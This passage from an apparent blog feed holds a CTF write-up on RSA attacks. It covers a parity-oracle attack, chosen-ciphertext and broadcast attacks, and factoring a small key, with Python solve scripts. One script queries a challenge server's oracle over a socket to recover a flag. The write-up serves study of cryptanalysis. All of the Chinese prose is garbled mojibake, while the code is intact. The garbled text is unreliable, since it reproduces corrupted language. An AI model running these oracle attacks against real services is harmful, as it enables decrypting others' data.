ÊòØÂÅ∂Êï∞ÔºåÊ≤°ÊúâË∂ÖËøánÔºåÂç≥<code>m&lt;n/2.0</code> ÔºåÂèç‰πãÂàô<code>m&gt;n/2.0</code> „ÄÇ‰∏æ‰∏™‰æãÂ≠êÂ∞±ËÉΩÊòéÁôΩ<code>2%3=2</code> ÊòØÂÅ∂Êï∞ÔºåËÄå<code>4%3=1</code> ÊòØÂ•áÊï∞„ÄÇ‰ª•Ê≠§Á±ªÊé®ÔºåÊûÑÈÄ†ÂØÜÊñá<code>c&quot;=(4^e)*c)%n</code> ‰ΩøÂÖ∂Ëß£ÂØÜÂêé‰∏∫<code>m&quot;=(4*m)%n</code>   ÔºåÂà§Êñ≠<code>m&quot;</code> ÁöÑÂ•áÂÅ∂ÊÄßÂèØ‰ª•Áü•ÈÅì<code>m</code> Âíå <code>n/4</code> ÁöÑÂ§ßÂ∞èÂÖ≥Á≥ª„ÄÇÊâÄ‰ª•Êàë‰ª¨Â∞±Êúâ‰∫Ü‰∏Ä‰∏™‰∫åÂàÜÁÆóÊ≥ïÔºåÂèØ‰ª•Âú®ÂØπÊï∞Êó∂Èó¥ÂÜÖÂ∞ÜmÁöÑËåÉÂõ¥ÈÄºËøëÂà∞‰∏Ä‰∏™Ë∂≥Â§üÁã≠Á™ÑÁöÑÁ©∫Èó¥„ÄÇ</p><p>Êõ¥Â§ö‰ø°ÊÅØÂèØÂèÇËÄÉÔºö<a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">RSA Least-Significant-Bit Oracle Attack</a>  Âíå <a href="https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack" target="_blank" rel="noopener">RSA least significant bit oracle attack</a> „ÄÇ</p><p>PythonÂÆûÁé∞Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lsb == <span class="string">'odd'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># for 'precise enough' floats</span></span><br><span class="line">    lo = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    hi = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            hi = (lo + hi) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lo = (lo + hi) / <span class="number">2</span></span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="comment"># print i, int(hi - lo)</span></span><br><span class="line">    <span class="keyword">return</span> int(hi)</span><br></pre></td></tr></table></figure><h3 id="‰æãÂ≠êÔºöQCTF2018-XManÈÄâÊãîËµõ-Baby-RSA"><a href="#‰æãÂ≠êÔºöQCTF2018-XManÈÄâÊãîËµõ-Baby-RSA" class="headerlink" title="‰æãÂ≠êÔºöQCTF2018-XManÈÄâÊãîËµõ/Baby RSA"></a>‰æãÂ≠êÔºöQCTF2018-XManÈÄâÊãîËµõ/Baby RSA</h3><p>È¢òÁõÆÂ¶Ç‰∏ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br><span class="line">c = <span class="number">0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span></span><br><span class="line"></span><br><span class="line">Œª nc <span class="number">47.96</span><span class="number">.239</span><span class="number">.28</span> <span class="number">23333</span></span><br><span class="line">----------------------------- baby rsa -----------------------------</span><br><span class="line">Come <span class="keyword">and</span> Decode your data</span><br><span class="line">If you give me ciphertext, I can tell you whether decoded data <span class="keyword">is</span> even <span class="keyword">or</span> odd</span><br><span class="line">You can input ciphertext(hexdecimal) now</span><br><span class="line"><span class="number">1</span></span><br><span class="line">odd</span><br></pre></td></tr></table></figure><p>Ëß£È¢òËÑöÊú¨Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="comment"># ref:</span></span><br><span class="line"><span class="comment"># https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack</span></span><br><span class="line"><span class="comment"># https://ctf.rip/sharif-ctf-2016-lsb-oracle-crypto-challenge/</span></span><br><span class="line"><span class="comment"># https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/</span></span><br><span class="line"><span class="keyword">import</span> libnum, gmpy2, socket, time, decimal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c1)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    hostname = <span class="string">'47.96.239.28'</span></span><br><span class="line">    port = <span class="number">23333</span></span><br><span class="line">    s.connect((hostname, port))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(hex(c1)[<span class="number">2</span>:].strip(<span class="string">"lL"</span>) + <span class="string">'\n'</span>)</span><br><span class="line">    res = s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'even'</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'odd'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">assert</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> c_of_2</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># allows for 'precise enough' floats</span></span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        <span class="comment"># lower==0 when i&lt;1809</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext  <span class="comment"># plaintext is in the lower half</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext  <span class="comment"># plaintext is in the upper half</span></span><br><span class="line">        c = (c * c_of_2) % n  <span class="comment"># multiply y by the encryption of 2 again</span></span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">        <span class="comment"># time.sleep(0.2)</span></span><br><span class="line">    <span class="comment"># By now, our plaintext is revealed!</span></span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Conducting Oracle attack..."</span></span><br><span class="line">    <span class="keyword">return</span> partial((c * c_of_2) % n, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br><span class="line">    c = <span class="number">0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span></span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>, e, n)</span><br><span class="line">    m = main()</span><br><span class="line">    <span class="comment"># m = 560856645743734814774953158390773525781916094468093308691660509501812349</span></span><br><span class="line">    <span class="keyword">print</span> libnum.n2s(m)</span><br><span class="line">    <span class="comment"># QCTF&#123;RSA_parity_oracle_is_fun&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1531637468518.png" alt="Baby RSA"></p><h2 id="ÈÄâÊã©ÂØÜÊñáÊîªÂáª"><a href="#ÈÄâÊã©ÂØÜÊñáÊîªÂáª" class="headerlink" title="ÈÄâÊã©ÂØÜÊñáÊîªÂáª"></a>ÈÄâÊã©ÂØÜÊñáÊîªÂáª</h2><p><strong>ÈÄÇÁî®ÊÉÖÂÜµÔºöÂèØ‰ª•ÊûÑÈÄ†‰ªªÊÑèÂØÜÊñáÂπ∂Ëé∑ÂæóÂØπÂ∫îÊòéÊñá„ÄÇ</strong> </p><p>Ëøô‰∏™Â•ΩÁêÜËß£ÔºåÂú®‰∏Ä‰∏™RSAÂä†ÂØÜËøáÁ®ã‰∏≠ÔºåÊòéÊñá‰∏∫mÔºåÂØÜÊñá‰∏∫cÔºåÊ®°Êï∞‰∏∫nÔºåÂä†ÂØÜÊåáÊï∞‰∏∫eÔºåÈÄâÂèñx‰ª•Êª°Ë∂≥<code>gcd(x,n)==1</code> ‰ªéËÄå‰ΩøxÊ®°nÁöÑÈÄÜÂ≠òÂú®ÔºåÊûÑÈÄ†ÂØÜÊñá <code>c&#39;=c*(x^e)</code> ‰ΩøËß£ÂØÜÂêéÊòéÊñá‰∏∫ <code>m&#39;=(m*x)%n</code> ÔºåÂàô<code>m=m&#39;*x^-1(mod n)</code> „ÄÇÂèØÂèÇÁúã<code>Ê®°ÊÑè‰πâ‰∏ãÁöÑËøêÁÆóÊ≥ïÂàôÈÉ®ÂàÜ</code> „ÄÇ</p><h2 id="ÂπøÊí≠ÊîªÂáª"><a href="#ÂπøÊí≠ÊîªÂáª" class="headerlink" title="ÂπøÊí≠ÊîªÂáª"></a>ÂπøÊí≠ÊîªÂáª</h2><p><strong>ÈÄÇÁî®ÊÉÖÂÜµÔºöÊ®°Êï∞n„ÄÅÂØÜÊñác‰∏çÂêåÔºåÊòéÊñám„ÄÅÂä†ÂØÜÊåáÊï∞eÁõ∏Âêå„ÄÇ‰∏ÄËà¨‰ºöÊòØe=kÔºåÁÑ∂ÂêéÁªôkÁªÑÊï∞ÊçÆ</strong></p><p>‰ΩøÁî®‰∏çÂêåÁöÑÊ®°Êï∞nÔºåÁõ∏ÂêåÁöÑÂÖ¨Èí•ÊåáÊï∞eÂä†ÂØÜÁõ∏ÂêåÁöÑ‰ø°ÊÅØ„ÄÇÂ∞±‰ºöÂæóÂà∞Â§ö‰∏™(m^e) ==ci (mod ni)ÔºåÂ∞Ü(m^e)ËßÜ‰∏∫‰∏Ä‰∏™Êï¥‰ΩìMÔºåËøôÂ∞±ÊòØÂÖ∏ÂûãÁöÑ‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜÈÄÇÁî®ÊÉÖÂÜµ„ÄÇÊåâÁÖßÊú¨ÊñáÁöÑ<code>‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜ</code>Â∞èËäÇÂÆπÊòìÊ±ÇÂæóm^eÁöÑÂÄºÔºåÂΩìeËæÉÂ∞èÊó∂Áõ¥Êé•ÂºÄeÊñπÂç≥ÂèØÔºåÂèØ‰ΩøÁî®<code>gmpy2.iroot(M,e)</code> ÊñπÊ≥ï„ÄÇ</p><p>PythonÂÆûÁé∞ÔºöÂèÇËßÅÊú¨Êñá <code>‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜ</code>Â∞èËäÇ„ÄÇ</p><h3 id="‰æãÂ≠êÔºö2018Âº∫ÁΩëÊùØnextrsa-Level9"><a href="#‰æãÂ≠êÔºö2018Âº∫ÁΩëÊùØnextrsa-Level9" class="headerlink" title="‰æãÂ≠êÔºö2018Âº∫ÁΩëÊùØnextrsa-Level9"></a>‰æãÂ≠êÔºö2018Âº∫ÁΩëÊùØnextrsa-Level9</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m = random.randint(<span class="number">0x100000000000</span>, <span class="number">0xffffffffffff</span>)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n1 = <span class="number">0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L</span></span><br><span class="line">n2 = <span class="number">0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L</span></span><br><span class="line">n3 = <span class="number">0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L</span></span><br><span class="line">c1 = pow(m, e, n1)</span><br><span class="line">c2 = pow(m, e, n2)</span><br><span class="line">c3 = pow(m, e, n3)</span><br><span class="line"><span class="keyword">print</span> m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h1 id="ÂÖ∂‰ªñ‰æãÈ¢ò"><a href="#ÂÖ∂‰ªñ‰æãÈ¢ò" class="headerlink" title="ÂÖ∂‰ªñ‰æãÈ¢ò"></a>ÂÖ∂‰ªñ‰æãÈ¢ò</h1><h2 id="„ÄêJarvis-OJ-Medium-RSA„ÄëËß£ÊûêÂÖ¨Èí•Êñá‰ª∂"><a href="#„ÄêJarvis-OJ-Medium-RSA„ÄëËß£ÊûêÂÖ¨Èí•Êñá‰ª∂" class="headerlink" title="„ÄêJarvis OJ Medium RSA„ÄëËß£ÊûêÂÖ¨Èí•Êñá‰ª∂"></a>„ÄêJarvis OJ Medium RSA„ÄëËß£ÊûêÂÖ¨Èí•Êñá‰ª∂</h2><p>‰ΩøÁî®ÂëΩ‰ª§‰ªéPEMÊñá‰ª∂ÔºàPrivacy-Enhanced Mail ÊòØÁî®‰∫éÂ≠òÂÇ®ÂíåÂèëÈÄÅÂØÜÈí•„ÄÅËØÅ‰π¶Á≠âÊï∞ÊçÆÁöÑÊñá‰ª∂Ê†ºÂºèÔºâ‰∏≠Ëß£ÊûêÂÖ¨Èí•ÂØπ(n,e)ÔºånÂèØÂú®Á∫øÊü•ËØ¢ (<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a>) Âà∞Ë¥®Âõ†Â≠êÔºåÂàÜËß£nÂæóÂà∞pÂíåqÔºå‰æøËÉΩÂ§üËÆ°ÁÆóÊ¨ßÊãâÂáΩÊï∞ÂÄºÂèäËß£ÂØÜÊåáÊï∞Ôºå‰ªéËÄåËß£ÂØÜ„ÄÇ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\neo\Downloads\mediumRSA.rar</span><br><span class="line">Œª openssl rsa -pubin -text -modulus -in pubkey.pem</span><br><span class="line">WARNING: can't open config file: /usr/local/ssl/openssl.cnf</span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>carck.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii</span><br><span class="line">n=<span class="number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"><span class="comment"># via http://factordb.com/</span></span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">c=int(open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">m=hex(pow(c,d,n))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(m.zfill(len(m)+<span class="number">8</span>-len(m)%<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h1 id="ÂêéËØù"><a href="#ÂêéËØù" class="headerlink" title="ÂêéËØù"></a>ÂêéËØù</h1><p>RSAÂèØË∞ìÁé∞‰ª£ÂØÜÁ†ÅÂ≠¶ÁöÑ‰∏≠ÊµÅÁ†•Êü±ÔºåÂÖ≥‰∫éÂÆÉÁöÑÂèØË°åÊîªÂáªÊñπÊ≥ïÁ†îÁ©∂ËøòÊúâÂæàÂ§öÔºåËØ∏Â¶ÇTiming Attack ÔºåPadding oracle attackÔºåSide-channel analysis attacksÁ≠âÁ±ªÂûãÁöÑÊîªÂáªÔºåÊú¨Êñá‰ªÖ‰ªãÁªç‰∫Ü‰∏Ä‰∫õÈÄö‰øóÊòìÊáÇÁöÑÊñπÊ≥ïÔºåËØªËÄÖËøòÂèØ‰ª•ÈòÖËØª <a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">CTF wiki‰∏≠ÁöÑÈùûÂØπÁß∞Âä†ÂØÜÈÉ®ÂàÜ</a> Ôºå‰ª•Âèä‰ª• <a href="https://en.wikipedia.org/wiki/RSA_%28cryptosystem%29" target="_blank" rel="noopener">RSA (cryptosystem)</a>  ‰∏∫ÁõÆÂΩïÁªìÂêàË∞∑Ê≠åËøõË°åËøõ‰∏ÄÊ≠•Â≠¶‰π†„ÄÇ </p><p>Êú¨ÊñáÁöÑ‰æãÈ¢òÈôÑ‰ª∂„ÄÅ‰ª£Á†ÅÊÆµ„ÄÅÂ∑•ÂÖ∑ÂíåÂêéÁª≠Êõ¥Êñ∞ÈÉΩ‰ºöÊîæÂú® <a href="https://github.com/findneo/RSA-ATTACK" target="_blank" rel="noopener">RSA-ATTACK</a> ÔºåÊ¨¢Ëøé star &amp; watch „ÄÇ</p><h1 id="ÂèÇËÄÉÈìæÊé•"><a href="#ÂèÇËÄÉÈìæÊé•" class="headerlink" title="ÂèÇËÄÉÈìæÊé•"></a>ÂèÇËÄÉÈìæÊé•</h1><p><a href="http://secgroup.dais.unive.it/wp-content/uploads/2012/11/Practical-Padding-Oracle-Attacks-on-RSA.html" target="_blank" rel="noopener">Practical Padding Oracle Attacks on RSA</a> </p><p> <a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">CTF wiki‰∏≠ÁöÑÈùûÂØπÁß∞Âä†ÂØÜÈÉ®ÂàÜ</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Êú¨ÊñáÈ¶ñÂèë&lt;a href=&quot;https://xz.aliyun.com/t/2446&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ÂÖàÁü•Á§æÂå∫&lt;/a&gt; ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÈìæÊé•„ÄÇ&lt;/strong&gt; &lt;/p&gt;
&lt;h1 id=&quot;CTF‰∏≠Â∏∏ËßÅÁöÑRSAÁõ∏ÂÖ≥ÈóÆÈ¢ò
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Ê†πÊçÆË±ÜÁì£ËßÇÂΩ±ËÆ∞ÂΩïÁîüÊàêÊµ∑Êä•</title>
    <link href="https://findneo.github.io/180706DoubanMovie/"/>
    <id>https://findneo.github.io/180706DoubanMovie/</id>
    <published>2018-07-06T15:51:56.000Z</published>
    <updated>2019-01-25T23:21:37.025Z</updated>
    
    <content type="html"><![CDATA[<p>ÊïàÊûúËßÅ <a href="https://findneo.github.io/p/movie.html">findneo ÁöÑËßÇÂΩ±ËÆ∞ÂΩï</a>  „ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment"># https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/</span></span><br><span class="line"><span class="comment"># http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># ÈÖçÁΩÆÁî®Êà∑IDÔºåÂèØÁôªÈôÜÂêéÊü•ÁúãÂú∞ÂùÄÊ†èËé∑Âèñ</span></span><br><span class="line">username=<span class="string">"findneo"</span></span><br><span class="line"><span class="comment"># 